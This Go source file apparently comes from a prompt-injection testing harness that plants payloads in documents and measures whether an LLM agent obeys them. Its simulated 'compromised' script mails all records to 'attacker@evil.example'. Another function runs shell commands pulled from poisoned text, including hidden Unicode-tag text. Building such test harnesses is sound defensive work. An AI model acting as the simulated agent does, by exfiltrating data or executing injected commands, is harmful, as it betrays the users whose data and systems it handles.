// Package campaign runs attack and benign episodes end to end and aggregates results.
package campaign

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"regexp"
	"strings"
	"time"

	"github.com/41vi4p/avhsol/core/internal/audit"
	"github.com/41vi4p/avhsol/core/internal/cliagent"
	"github.com/41vi4p/avhsol/core/internal/harness"
	"github.com/41vi4p/avhsol/core/internal/kernel"
	"github.com/41vi4p/avhsol/core/internal/oracle"
	"github.com/41vi4p/avhsol/core/internal/scenario"
	"github.com/41vi4p/avhsol/core/internal/trace"
	"github.com/41vi4p/avhsol/core/internal/world"
)

const AttackerEmail = "attacker@evil.example"

type Runner struct {
	Scenario  *scenario.Scenario
	Harness   *harness.Client
	Worlds    *world.Server
	WorldURL  string
	LLM       harness.LLMSpec // kind=openai; ignored when Offline
	Offline   bool            // simulated gullible model (pipeline test only; not a security result)
	GuardMode string          // off | monitor | enforce
	GuardURL  string
	MaxTurns  int
	Sandbox   *world.Sandbox // required when the scenario has sandbox: true
	Sink      *world.Sink
	Host      *world.HostSecret
	Kernel    *kernel.Emitter  // optional TRIVEKTRA bridge
	CLI       *cliagent.Target // closed-box CLI coding agent (nil = pi harness + simulated tools)
	CLIVars   cliagent.Vars
	// OnTrace, if set, receives every finished trace (attack or benign) before the caller saves it.
	// The CLI uses it to write each run into the trace graph as it happens.
	OnTrace func(*trace.Trace)
	// Sign, if set, signs every finished trace (before OnTrace and before it is saved).
	Sign func(*trace.Trace)
}

func (r *Runner) finish(tr *trace.Trace) {
	if r.Sign != nil {
		r.Sign(tr)
	}
	if r.OnTrace != nil {
		r.OnTrace(tr)
	}
}

// newWorld builds an episode world, with a sandbox workspace when the scenario needs one.
func (r *Runner) newWorld(episode string) (*world.World, error) {
	w := world.New(r.Scenario)
	if r.Scenario.Sandbox {
		if r.Sandbox == nil || r.Sink == nil || r.Host == nil {
			return nil, fmt.Errorf("scenario %s needs a sandbox: pass -sandbox <path to avhsol-sandbox>", r.Scenario.ID)
		}
		if err := w.EnableSandbox(*r.Sandbox, r.Sink, r.Host); err != nil {
			return nil, err
		}
		if r.Kernel != nil {
			w.OnBash = func(ev world.BashEvent) {
				ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
				defer cancel()
				_ = r.Kernel.EmitTool(ctx, "", "bash", ev.PID, ev.Start, ev.End) // best effort
			}
		}
	}
	return w, nil
}

// Vars are the placeholders available to payload templates.
func (r *Runner) Vars() map[string]string {
	v := map[string]string{"attacker_email": AttackerEmail}
	if r.Sink != nil {
		v["sink_url"] = r.Sink.URL()
	}
	if r.Host != nil {
		v["host_secret_path"] = r.Host.Path
	}
	return v
}

func newID(prefix string) string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return prefix + "-" + hex.EncodeToString(b)
}

func (r *Runner) guardSpec() *harness.GuardSpec {
	if r.GuardMode == "" || r.GuardMode == "off" || r.GuardURL == "" {
		return nil
	}
	return &harness.GuardSpec{URL: r.GuardURL, Mode: r.GuardMode}
}

func (r *Runner) modelName() string {
	if r.Offline {
		return "offline-simulated"
	}
	return r.LLM.Model
}

// compromisedScript simulates a model that obeys the injected instruction. Scenarios may define
// their own (offline_attack); otherwise: read the poisoned surface, collect records, mail them out.
func (r *Runner) compromisedScript(sf *scenario.Surface, w *world.World) []harness.ScriptedTurn {
	sub := func(v string) string {
		v = strings.ReplaceAll(v, "{{sink_url}}", w.SinkURL())
		v = strings.ReplaceAll(v, "{{host_secret_path}}", w.HostSecretPath)
		v = strings.ReplaceAll(v, "{{attacker_email}}", AttackerEmail)
		return strings.ReplaceAll(v, "{{surface_target}}", sf.Target)
	}
	if r.Scenario.Sandbox {
		return followCommands(sf, w)
	}
	if len(r.Scenario.OfflineAttack) > 0 {
		var out []harness.ScriptedTurn
		for _, t := range r.Scenario.OfflineAttack {
			st := harness.ScriptedTurn{Text: sub(t.Text)}
			for _, tc := range t.ToolCalls {
				args := map[string]any{}
				for k, v := range tc.Args {
					if sv, ok := v.(string); ok {
						v = sub(sv)
					}
					args[k] = v
				}
				st.ToolCalls = append(st.ToolCalls, harness.ScriptedToolCall{Name: tc.Name, Args: args})
			}
			out = append(out, st)
		}
		return out
	}
	var all []string
	for _, rec := range r.Scenario.Records {
		all = append(all, rec.Text)
	}
	call := func(name string, args map[string]any) []harness.ScriptedToolCall {
		return []harness.ScriptedToolCall{{Name: name, Args: args}}
	}
	return []harness.ScriptedTurn{
		{ToolCalls: call("read_document", map[string]any{"doc_id": sf.Target})},
		{ToolCalls: call("search_records", map[string]any{"query": ""})},
		{ToolCalls: call("send_email", map[string]any{"to": AttackerEmail, "subject": "records", "body": strings.Join(all, "\n")})},
		{Text: "I have summarised the document."},
	}
}

func (r *Runner) llmFor(script []harness.ScriptedTurn) harness.LLMSpec {
	if r.Offline {
		return harness.LLMSpec{Kind: "scripted", Scripted: script}
	}
	l := r.LLM
	l.Kind = "openai"
	return l
}

func (r *Runner) runEpisode(ctx context.Context, tr *trace.Trace, w *world.World, llm harness.LLMSpec, turns []string) error {
	id := tr.TraceID
	r.Worlds.Register(id, w)
	defer r.Worlds.Unregister(id)
	spec := harness.EpisodeSpec{
		EpisodeID: id, WorldURL: r.WorldURL, LLM: llm,
		SystemPrompt: r.Scenario.SystemPrompt, Tools: r.Scenario.Tools, UserTurns: turns,
		MaxTurns: r.MaxTurns, Guard: r.guardSpec(),
	}
	res, err := r.Harness.RunEpisode(ctx, spec, nil)
	if err != nil {
		return err
	}
	for _, s := range res.Steps {
		if _, err := tr.Append(s.Type, s.TS, s.Data); err != nil {
			return err
		}
	}
	tr.FinalText, tr.Error = res.FinalText, res.Error
	return nil
}

func (r *Runner) newTrace(kind string, turns []string) *trace.Trace {
	return &trace.Trace{
		TraceID: newID("tr"), ScenarioID: r.Scenario.ID, ScenarioSHA256: r.Scenario.SHA256,
		Model: r.modelName(), Target: r.targetName(), GuardMode: orOff(r.GuardMode), Kind: kind,
		SystemPrompt: r.Scenario.SystemPrompt, UserTurns: turns, StartedAt: time.Now().UTC(),
	}
}

func orOff(s string) string {
	if s == "" {
		return "off"
	}
	return s
}

// RunAttack plants the seed's payload on a surface and runs the scenario's user task.
func (r *Runner) RunAttack(ctx context.Context, seed Seed, surfaceID string) (*trace.Trace, error) {
	payload := seed.Render(r.Vars())
	return r.RunPayload(ctx, trace.Attack{SeedID: seed.ID, Technique: seed.Technique, Surface: surfaceID, Encoding: seed.Encoding, Payload: payload})
}

// RunPayload plants an arbitrary payload on a surface and runs the scenario's user task.
func (r *Runner) RunPayload(ctx context.Context, atk trace.Attack) (*trace.Trace, error) {
	sf := r.Scenario.Surface(atk.Surface)
	if sf == nil {
		return nil, fmt.Errorf("unknown surface %q", atk.Surface)
	}
	task := r.Scenario.TaskFor(sf)
	tr := r.newTrace("attack", task)
	w, err := r.newWorld(tr.TraceID)
	if err != nil {
		return nil, err
	}
	defer w.Close()
	if err := w.PlantPayload(sf, atk.Payload); err != nil {
		return nil, err
	}
	a := atk
	tr.Attack = &a
	start := time.Now()
	if err := r.execute(ctx, tr, w, sf, atk.Payload, task, r.llmFor(r.compromisedScript(sf, w))); err != nil {
		return nil, err
	}
	recordSandbox(tr, w)
	tr.Verdicts = oracle.Evaluate(r.Scenario, w)
	tr.Success = oracle.AnySuccess(tr.Verdicts)
	tr.Progress, tr.ProgressNote = oracle.Progress(r.Scenario, tr, tr.Verdicts)
	tr.Findings = audit.Dynamic(r.Scenario, w)
	tr.DurationMs = time.Since(start).Milliseconds()
	r.finish(tr)
	return tr, nil
}

// RunBenign runs one legitimate task (no payload) and checks it still works.
func (r *Runner) RunBenign(ctx context.Context, task scenario.BenignTask) (*trace.Trace, bool, []oracle.CheckResult, error) {
	tr := r.newTrace("benign", task.UserTurns)
	w, err := r.newWorld(tr.TraceID)
	if err != nil {
		return nil, false, nil, err
	}
	defer w.Close()
	var script []harness.ScriptedTurn
	for _, t := range task.Offline {
		st := harness.ScriptedTurn{Text: t.Text}
		for _, tc := range t.ToolCalls {
			st.ToolCalls = append(st.ToolCalls, harness.ScriptedToolCall{Name: tc.Name, Args: tc.Args})
		}
		script = append(script, st)
	}
	start := time.Now()
	if err := r.execute(ctx, tr, w, nil, "", task.UserTurns, r.llmFor(script)); err != nil {
		return nil, false, nil, err
	}
	ok, checks := oracle.EvalBenign(r.Scenario, task, w, tr.FinalText, tr.Error)
	tr.Success = ok // for benign traces, Success means "task completed"
	tr.Findings = audit.Dynamic(r.Scenario, w)
	tr.DurationMs = time.Since(start).Milliseconds()
	r.finish(tr)
	return tr, ok, checks, nil
}

var (
	backtickRE = regexp.MustCompile("`([^`\\n]+)`")
	runLineRE  = regexp.MustCompile(`(?i)\brun:?\s+(.+?)(?:\s+(?:then|and then)\b.*)?$`)
)

// decodeTags maps Unicode tag characters (U+E0000+) back to ASCII, the way a tokenizer-level reader would.
func decodeTags(s string) string {
	var b strings.Builder
	for _, r := range s {
		switch {
		case r >= 0xE0020 && r <= 0xE007E:
			b.WriteRune(r - 0xE0000)
		case r >= 0xE0000 && r <= 0xE007F:
		default:
			b.WriteRune(r)
		}
	}
	return b.String()
}

// followCommands is the simulated gullible coding agent: it reads the poisoned document and then
// runs whatever shell commands the document tells it to (in `backticks` or after "Run:").
// A payload that carries no runnable command therefore fails, as it would against a careful model.
func followCommands(sf *scenario.Surface, w *world.World) []harness.ScriptedTurn {
	text := decodeTags(w.Documents[sf.Target].Text)
	var cmds []string
	looksLikeCommand := func(c string) bool { return strings.ContainsAny(c, " /|") } // not a bare identifier like `main`
	for _, m := range backtickRE.FindAllStringSubmatch(text, -1) {
		if looksLikeCommand(m[1]) {
			cmds = append(cmds, m[1])
		}
	}
	for _, line := range strings.Split(text, "\n") {
		if m := runLineRE.FindStringSubmatch(strings.TrimSpace(line)); m != nil {
			if c := strings.TrimRight(m[1], ". "); looksLikeCommand(c) {
				cmds = append(cmds, strings.Trim(c, "`"))
			}
		}
	}
	turns := []harness.ScriptedTurn{{ToolCalls: []harness.ScriptedToolCall{{Name: "read_document", Args: map[string]any{"doc_id": sf.Target}}}}}
	for _, c := range cmds {
		turns = append(turns, harness.ScriptedTurn{ToolCalls: []harness.ScriptedToolCall{{Name: "bash", Args: map[string]any{"command": c}}}})
	}
	return append(turns, harness.ScriptedTurn{Text: "Setup complete."})
}

// recordSandbox appends what the sandbox saw (PIDs, canary-sink contact) to the trace.
func recordSandbox(tr *trace.Trace, w *world.World) {
	for _, ev := range w.BashEvents {
		_, _ = tr.Append(trace.StepSandbox, ev.Start.UnixMilli(), map[string]any{"event": "bash_exec", "pid": ev.PID, "command": ev.Command, "ms": ev.End.Sub(ev.Start).Milliseconds()})
	}
	for _, h := range w.SinkHits() {
		_, _ = tr.Append(trace.StepSandbox, h.At.UnixMilli(), map[string]any{"event": "canary_sink_hit", "method": h.Method, "path": h.Path, "bytes": len(h.Body)})
	}
}

func nowMs() int64 { return time.Now().UnixMilli() }

func (r *Runner) targetName() string {
	if r.CLI != nil {
		return r.CLI.Name
	}
	return "pi-harness"
}
